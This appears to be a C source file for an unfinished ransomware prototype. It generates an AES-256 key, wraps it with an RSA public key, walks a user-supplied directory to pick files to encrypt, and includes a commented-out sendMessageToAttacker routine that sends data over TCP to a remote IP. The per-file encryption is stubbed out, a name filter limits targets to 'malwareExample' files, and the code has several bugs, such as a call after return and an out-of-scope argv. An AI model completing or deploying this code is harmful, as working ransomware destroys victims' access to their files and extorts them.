#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>


EVP_CIPHER_CTX* dirEncryptContext = NULL;
unsigned char* dirEncryptKey = NULL;

//sets outLen to final length of encrypted key
//returns encrypted key
unsigned char* encryptTempKey(unsigned char* tempKey, int tempKeyLen, size_t* outLen){


    //assumes the public key will always be name public.pem and be at same directory level
    FILE* pubKeyFilePtr = fopen("public.pem", "r");
    if(!pubKeyFilePtr){
        printf("Error opening public key file\n");
        return 0;
    }

    EVP_PKEY * pubkeyPtr = PEM_read_PUBKEY(pubKeyFilePtr, NULL,NULL, NULL);

    EVP_PKEY_CTX *ctx;
    EVP_PKEY *key;
    unsigned char * out;

    ctx = EVP_PKEY_CTX_new(pubkeyPtr, NULL);

    if (!ctx){
        printf("Error generating pubkey context\n");
        return 0;
    }

    int retVal;
    retVal= EVP_PKEY_encrypt_init(ctx);
    if(retVal <1){
        printf("Error initializing pubkey context\n");
        return 0;
    }

    retVal = EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING);
    if(retVal <1){
        printf("Error setting padding context\n");
        return 0;
    }

    /* Determine buffer length */
    retVal = EVP_PKEY_encrypt(ctx, NULL, outLen, tempKey, tempKeyLen);
    if(retVal <1){
        printf("Error buffer length context\n");
        return 0;
    }

    out = OPENSSL_malloc(*outLen);
    if (!out){
        printf("Error out buffer alloc\n");
        return 0;
    }

    retVal = EVP_PKEY_encrypt(ctx, out, outLen, tempKey, tempKeyLen);
    if (retVal<1){
        printf("Error public encrypt\n");
        return 0;
    }

    printf("Encrypted Key Size: %i\n", (int)*outLen);
    printf("Encrypt Key: ");
    for(int i =0;i <*outLen; i++){

        printf("_ %i",(int) out[i]);

    }
    printf("\n");



    return out;

    fclose(pubKeyFilePtr);
}


int block_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
{

   /* EVP_CIPHER_CTX *ctx;

    int len;
    int outLength = plaintext_len;


    ctx = EVP_CIPHER_CTX_new();


    EVP_EncryptInit_ex(ctx,  EVP_aes_256_cbc(), NULL,key,iv);


    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);


    EVP_EncryptFinal_ex(ctx,ciphertext + outLength ,&outLength);


    EVP_CIPHER_CTX_free(ctx);


    return outLength;
    */
   return 0;
}

int sendMessageToAttacker(char* encryptedKey){

    /*int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(argv[1]);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    //connect to socket
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    // Get input from the user:
    size_t clientMsgSize = 100;
    unsigned char clientMessage[clientMsgSize];
    printf("Enter message sent to the server(100 char max): ");
    fgets(clientMessage, clientMsgSize, stdin);

    size_t cipherLength = clientMsgSize +16+1;
    unsigned char cipherText[cipherLength];

    int cipherLengthReal = block_encrypt(clientMessage, clientMsgSize, argv[2], argv[3], cipherText);

    cipherText[cipherLength] = 0;
    printf("Client sends cipher text:\n");
    printf( "%s\n",cipherText);


    // Send the message to server:
    ssize_t bytesSent = send(sockfd, cipherText, cipherLength, 0);
    if(bytesSent == -1) {
        printf("errorSending\n");
        return -1;
    }

    // Receive the server's response:
    size_t inputBufferLength = 100;
    char inputBuffer[inputBufferLength];
    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    if(bytesReceived == -1){
        printf("errorReceive\n");
        return -1;
    }
    else printf("Server says: %s\n", inputBuffer);

    // Close the socket:
    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }


     */
    return 0;

}

//assumes both char arrays have null terminator
char* concatStrings(char* str1, char* str2){

    int str1Len = 0;
    while(str1[str1Len] != 0){
        str1Len++;
    }
    int str2Len = 0;
    while(str2[str2Len] != 0){
        str2Len++;
    }

    //length of new string has one added to it to include new null terminator
    char* concat = (char*)malloc((str1Len + str2Len + 1) * sizeof(char));

    for(int i =0; i <str1Len; i++){
        concat[i] = str1[i];
    }
    for(int i =0; i < str2Len; i++){
        concat[i+str1Len] = str2[i];
    }
    concat[str1Len + str2Len] = 0;
    return concat;

}


int encryptFile(struct stat* entryInfo, char* fullPath, char* fileName){

    printf("encrypting file %s\n", fileName );
}

//returns 1 for yes, 0 for no
//these are some arbitrary conditions the file needs to have in order to be encrypted.
//mainly a safeguard to make sure it doesnt accidently go rogue.
int checkIfEncryptFile(char* fullPath, char* fileName){

    if(strstr(fileName, "malwareExample")){

        return 1;
    }
    else{
        return 0;
    }
}
int navigateUserDirectory(char* directoryPath){

    int len;
    int outLength = 0;
    int errorVal = 0;

    //symmetric(temporary) key generation
    if(dirEncryptContext == NULL){

        dirEncryptContext = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(dirEncryptContext,  EVP_aes_256_cbc(), NULL,NULL,NULL);

        int keyLen = EVP_CIPHER_CTX_key_length(dirEncryptContext);

        //key is not given a null terminating char, it is just a normal char array
        dirEncryptKey = (unsigned char*)malloc((keyLen) * sizeof(unsigned char));

        errorVal = EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);
        if(errorVal <1){
            printf("%s", "Error with symmetric key gen\n");
            return -1;

        }
        else{

            printf("Key Size: %i\n", keyLen);
            printf("Key: ");
            for(int i =0;i <keyLen; i++){

                printf("_ %i",(int) dirEncryptKey[i]);

            }
            printf("\n");

            size_t encryptedLen;
            encryptTempKey(dirEncryptKey,keyLen,&encryptedLen);
        }

    }

    DIR* userDir;
    if ((userDir = opendir(directoryPath)) == NULL) {
        perror("Cannot open path ");
        exit(1);
    }

    struct dirent* currentEntry = NULL;

    while ((currentEntry = readdir(userDir)) != NULL) {

        char* entryName = (*currentEntry).d_name;

        //ignore hidden dirs
        if((strcmp(entryName,".") == 0) || (strcmp(entryName,"..") == 0)) continue;

        char slash[2] = {'/',0};
        char* dirWithSlash = concatStrings(directoryPath,slash);
        char* fullPath = concatStrings(dirWithSlash, entryName);

        printf("%s\n", fullPath);

        struct stat entryInfo;
        if(stat(fullPath,&entryInfo) < 0){
            perror("Cannot open entry ");
            exit(1);
        }

        //S_IFMT is bit mask for file type, st_mode is mask for file type and some other info.
        int mask = entryInfo.st_mode & S_IFMT;
        if(mask == S_IFREG){
            printf("reg file\n");
            if(checkIfEncryptFile(fullPath,entryName)) encryptFile(&entryInfo,fullPath,entryName);

        }
        else{
            if(mask == S_IFDIR)printf("directory\n");
            //we only care about regular files, which we will encrypt, and directories,which we may recurse on.
        }

    }
    printf("null reached ");

    return 0;


}

int main(int argc, unsigned char** argv){

    if(argc < 2){
        printf("provide a directory\n");
        return 0;
    }
    printf("%s\n", argv[0]);
    printf("%s\n", argv[1]);
    navigateUserDirectory(argv[1]);



    return 0;

}
